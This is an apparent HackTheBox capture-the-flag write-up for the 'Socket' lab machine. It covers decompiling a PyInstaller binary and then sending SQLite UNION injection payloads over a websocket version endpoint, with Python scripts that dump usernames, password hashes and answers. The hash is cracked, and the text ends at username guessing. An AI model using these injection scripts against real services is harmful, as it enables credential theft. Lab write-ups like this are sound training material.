<h3> Socket HackTheBox </h3>

### Difficulty = Medium

### IP Address = 10.129.192.218

Nmap Scan
![image](https://user-images.githubusercontent.com/127159644/227752209-8bcc9dfd-8685-4712-aa97-27157cefbd71.png)

I added the domain to my `/etc/hosts/` file 

After checking the web server
![image](https://user-images.githubusercontent.com/127159644/227752256-e92d99e0-3e8d-4e55-a8c8-bca0c05f4ec9.png)

The only function there is that it checks converts a string to a qr code or it decodes a qr code and shows it content

THere's a given file which can be downloaded
![image](https://user-images.githubusercontent.com/127159644/227752314-2284d46b-4768-4e7a-9dd7-a0eb2ec0be61.png)

After downloading the file given which turns out to be a zip file i extracted it
![image](https://user-images.githubusercontent.com/127159644/227752448-abeca5ea-8dc0-455f-835f-38296891d3d4.png)

And its looks like a python compiled binary

So we can decompile it using uncompyle6 but before that we need to convert it to a pyc file

```
pyi-archive_viewer qreader
? X qreader
to filename? ./qreader.pyc
```

Then decompile using uncompyle6

```
uncompyle6 qreader.pyc > qreader.py
```

I encountered issues with this because it works with python3.8 and ever since i updated my linux its been misbehaving

So i used vps (thm attack box) for this
![image](https://user-images.githubusercontent.com/127159644/227753837-e8cd7d82-cd74-4b3d-bcd0-d512a8d915a6.png)

Here's the vulnerable part of the code

```
...
ws_host = 'ws://ws.qreader.htb:5789'
...
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)
...

```

It calls to the web socket hosted on port 5789 and sends the value of version in json format to the /version endpoint

After meeting chatgpt for a script to connect to the ws socket it formed this

```
from websocket import *
import sys, json

ws_host = 'ws://ws.qreader.htb:5789'

VERSION = '0.0.2'

ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```

Trying that works

```
➜  Socket python3.10 connect.py
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
➜  Socket 
```

From here the best thing to try i guess is sql injection

I followed [Resource](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) and got that its sqlite injection

From there i got the user table and password table

Here's the script

```
from websocket import *
import sys, json

ws_host = 'ws://ws.qreader.htb:5789'

VERSION = '0.0.3" UNION SELECT username,password,3,4 from users-- -'

ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()


VERSION = '0.0.3" UNION SELECT group_concat(answered_by),group_concat(answer),3,4 from answers-- -'

ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```

Running that gives the password hash and a user
![image](https://user-images.githubusercontent.com/127159644/227754380-c1c77931-d900-4ee9-8dab-ac74897cfcde.png)

Using crackstation i got the password value for the hash
![image](https://user-images.githubusercontent.com/127159644/227754411-cde3b0c2-79bd-4f48-bf39-97b283f91531.png)

Now we have password how about user? 

If you notice the name `Thomas Keller` we can try get like possible usernames from it 

Using a [Script](https://github.com/PinkDraconian/CTF-bash-tools/blob/master/scripts/ctf-wordlist-names.sh)i generated possible usernames 
![image](https://user-images.githubusercontent.com/127159644/227754495-1e801d2c-c4c7-4121-8386-bf4a0d8bf54f.png)



